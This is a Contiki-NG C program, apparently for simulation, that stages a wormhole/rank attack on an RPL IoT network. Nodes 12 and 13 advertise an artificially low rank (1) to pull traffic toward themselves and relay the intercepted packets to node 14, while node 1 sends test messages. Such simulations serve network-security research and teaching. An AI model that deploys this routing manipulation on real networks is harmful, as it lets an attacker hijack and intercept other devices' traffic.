#include "contiki.h"
#include "net/ipv6/simple-udp.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-dag.h"
#include "sys/etimer.h"
#include "sys/node-id.h"
#include <stdio.h>
#include <string.h>

#define UDP_PORT 1234
#define DESTINATION_NODE 14

static struct simple_udp_connection udp_conn;

// Function for malicious nodes to intercept and forward packets
static void malicious_receiver(struct simple_udp_connection *c,
                               const uip_ipaddr_t *sender_addr,
                               uint16_t sender_port,
                               const uip_ipaddr_t *receiver_addr,
                               uint16_t receiver_port,
                               const uint8_t *data,
                               uint16_t datalen) {
  uip_ipaddr_t dest_ipaddr;

  // Node 12 forwards packets to Node 13
  if (node_id == 12) {
    uip_ip6addr(&dest_ipaddr, 0xfe80, 0, 0, 0, 0, 0x212, 0x740d, 0xd0d1); // Node 13 IPv6
    printf("Malicious Node 12: Intercepted packet. Forwarding to Node 13.\n");
    simple_udp_sendto(&udp_conn, data, datalen, &dest_ipaddr);
  }
  // Node 13 forwards packets to Node 14
  else if (node_id == 13) {
    uip_ip6addr(&dest_ipaddr, 0xfe80, 0, 0, 0, 0, 0x212, 0x740e, 0xe0e1); // Node 14 IPv6
    printf("Malicious Node 13: Forwarded packet to Node 14 (Destination).\n");
    simple_udp_sendto(&udp_conn, data, datalen, &dest_ipaddr);
  }
}

// Function to manipulate RPL DIO metrics (Malicious Nodes)
static void manipulate_dio_metrics(void) {
  rpl_dag_t *dag = rpl_get_any_dag();
  if (dag) {
    dag->rank = 1; // Set an artificially low rank to attract traffic
    printf("Malicious Node %u: Advertising low-rank DIO (Rank: 1).\n", node_id);
  }
}

// Receiver function for normal nodes
static void receiver(struct simple_udp_connection *c,
                     const uip_ipaddr_t *sender_addr,
                     uint16_t sender_port,
                     const uip_ipaddr_t *receiver_addr,
                     uint16_t receiver_port,
                     const uint8_t *data,
                     uint16_t datalen) {
  printf("Node %u: Received packet from Node %02x.%02x. Content: %.*s\n",
         node_id, sender_addr->u8[14], sender_addr->u8[15], datalen, data);
}

// Source Node Process
PROCESS(source_process, "Source Node Process");
PROCESS_THREAD(source_process, ev, data) {
  static struct etimer timer;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();
  simple_udp_register(&udp_conn, UDP_PORT, NULL, UDP_PORT, receiver);

  while (1) {
    etimer_set(&timer, CLOCK_SECOND * 5);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    uip_ip6addr(&dest_ipaddr, 0xfe80, 0, 0, 0, 0, 0x212, 0x740e, 0xe0e1); // Node 14 IPv6
    printf("Source Node (Node 1): Sending packet to Node 14.\n");
    simple_udp_sendto(&udp_conn, "Hello to Node 14", 16, &dest_ipaddr);
  }

  PROCESS_END();
}

// Malicious Node Process
PROCESS(malicious_process, "Malicious Node Process");
PROCESS_THREAD(malicious_process, ev, data) {
  static struct etimer dio_timer;

  PROCESS_BEGIN();
  simple_udp_register(&udp_conn, UDP_PORT, NULL, UDP_PORT, malicious_receiver);

  while (1) {
    etimer_set(&dio_timer, CLOCK_SECOND * 5);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&dio_timer));

    // Manipulate DIO metrics to advertise the wormhole path
    manipulate_dio_metrics();
  }

  PROCESS_END();
}

// Normal Node Process
PROCESS(normal_node_process, "Normal Node Process");
PROCESS_THREAD(normal_node_process, ev, data) {
  PROCESS_BEGIN();
  simple_udp_register(&udp_conn, UDP_PORT, NULL, UDP_PORT, receiver);
  PROCESS_END();
}

// Main Process - Determines Node Behavior
PROCESS(main_process, "Main Process");
AUTOSTART_PROCESSES(&main_process);

PROCESS_THREAD(main_process, ev, data) {
  PROCESS_BEGIN();

  if (node_id == 1) {
    printf("Node %u: Starting as Source Node.\n", node_id);
    process_start(&source_process, NULL);
  } else if (node_id == 12 || node_id == 13) {
    printf("Node %u: Starting as Malicious Node.\n", node_id);
    process_start(&malicious_process, NULL);
  } else {
    printf("Node %u: Starting as Normal Node.\n", node_id);
    process_start(&normal_node_process, NULL);
  }

  PROCESS_END();
}




